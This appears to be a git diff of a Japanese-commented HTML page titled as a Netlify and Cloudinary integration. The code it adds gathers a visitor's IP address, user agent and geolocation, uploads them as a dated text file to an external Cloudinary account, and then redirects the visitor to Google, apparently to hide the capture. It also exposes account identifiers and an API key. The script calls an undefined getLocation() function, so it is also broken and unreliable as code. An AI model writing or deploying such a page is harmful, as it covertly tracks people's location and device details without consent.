@@ -1,47 +1,74 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>test</title>
+  <title>Netlify + Cloudinary Integration</title>
 </head>
 <body>
   <script>
-    // IPアドレスの取得（Netlify Functionを使用）
-    fetch('/.netlify/functions/getIpAddress')
-      .then(response => response.text())
-      .then(ipAddress => {
-        console.log('IP Address:', ipAddress.trim());
+    // Cloudinaryの設定
+    const cloud_name = "dxzsajngl";
+    const upload_preset = "gmr5c3hg";
+    const folder_name = "date";
 
-        // 位置情報の取得
-        navigator.geolocation.getCurrentPosition(function(position) {
+    // ファイルをアップロードする関数
+    function uploadFile(file) {
+      // FormDataオブジェクトを作成
+      const formData = new FormData();
+      formData.append("file", file);
+      formData.append("upload_preset", upload_preset);
+      formData.append("folder", folder_name); // フォルダ名を指定
+
+      // fetch APIを使用してファイルをアップロード
+      fetch(`https://api.cloudinary.com/v1_1/${cloud_name}/upload`, {
+        method: "POST",
+        body: formData,
+      })
+        .then((response) => response.json())
+        .then((data) => {
+          console.log("File uploaded to Cloudinary!");
+          console.log("Public URL: ", data.secure_url);
+
+          // アップロードが完了したらGoogleを開く
+          window.location.href = "https://google.com";
+        })
+        .catch((error) => {
+          console.log("Error uploading file: ", error);
+        });
+    }
+
+    // 位置情報と本体情報を含むテキストファイルをアップロードする関数
+    function uploadData(ipAddress, userAgent, latitude, longitude, altitude) {
+      const currentDate = new Date();
+      const dateString = currentDate.toISOString().split("T")[0]; // 日付を取得して文字列に変換
+
+      const text = `IPアドレス: ${ipAddress}, User Agent: ${userAgent}, Latitude: ${latitude}, Longitude: ${longitude}, Altitude: ${altitude}, 日付: ${dateString}`;
+      const file = new File([text], `${dateString}.txt`, { type: "text/plain" });
+
+      uploadFile(file);
+    }
+
+    // 位置情報の取得とファイルのアップロードを実行
+    function uploadLocation(position) {
+      // IPアドレスを取得（Netlify Functionを使用）
+      fetch('/.netlify/functions/getIpAddress')
+        .then(response => response.text())
+        .then(ipAddress => {
+          const userAgent = window.navigator.userAgent;
           const latitude = position.coords.latitude;
           const longitude = position.coords.longitude;
+          const altitude = position.coords.altitude;
 
-          // CloudinaryのAPIキー
-          const cloudinaryApiKey = '965591649852323';
-
-          // ファイルデータの作成
-          const fileData = new FormData();
-          fileData.append('file', new Blob([`Latitude: ${latitude}\nLongitude: ${longitude}\nIP Address: ${ipAddress}`], { type: 'text/plain' }));
-          fileData.append('upload_preset', 'phc2hgop'); // Cloudinaryのアップロードプリセットを設定
-
-          // Cloudinaryにファイルをアップロード
-          fetch(`https://api.cloudinary.com/v1_1/dxzsajngl/upload`, {
-            method: 'POST',
-            body: fileData
-          })
-          .then(response => response.json())
-          .then(data => {
-            console.log('File uploaded to Cloudinary:', data);
-            // ファイルがアップロードされた後の処理をここに追加
-          })
-          .catch(error => {
-            console.error('Error uploading file to Cloudinary', error);
-          });
+          // ファイルのアップロード
+          uploadData(ipAddress.trim(), userAgent, latitude, longitude, altitude);
+        })
+        .catch(error => {
+          console.error('Error getting IP address', error);
         });
-      })
-      .catch(error => {
-        console.error('Error getting IP address', error);
-      });
+    }
+
+    // 位置情報の取得とファイルのアップロードを実行
+    getLocation();
+
   </script>
 </body>
 </html>
